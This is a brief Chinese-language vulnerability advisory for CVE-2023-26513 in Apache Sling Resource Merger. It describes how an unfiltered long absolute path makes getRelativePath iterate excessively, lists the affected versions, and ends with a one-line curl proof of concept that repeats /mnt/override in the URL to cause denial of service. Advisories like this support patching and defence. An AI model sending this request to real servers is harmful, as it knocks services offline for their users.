# CVE-2023-26513

## 漏洞简介

Apache Sling 是一个基于可扩展内容树的 RESTful Web 应用程序框架，Resource Merger 用于在运行时将多个 Sling 资源合并为一个虚拟资源树。

MergingResourceProvider.java 类中的 getRelativePath 方法用于将跟路径之外的绝对路径转化为相对路径，Apache Sling 受影响版本中由于该方法未对用户传入的绝对路径参数进行过滤，攻击者可通过在发送的资源合并请求的 url 后缀中添加过长的绝对路径造成拒绝服务。

## 影响范围

-   1.2.0 <= Apache Sling Resource Merger < 1.4.2

## 漏洞类型

过度迭代

## POC

```shell
curl -u <user>:<pass> http://{url}:4502/aem/start.html//mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/mnt/override/
```

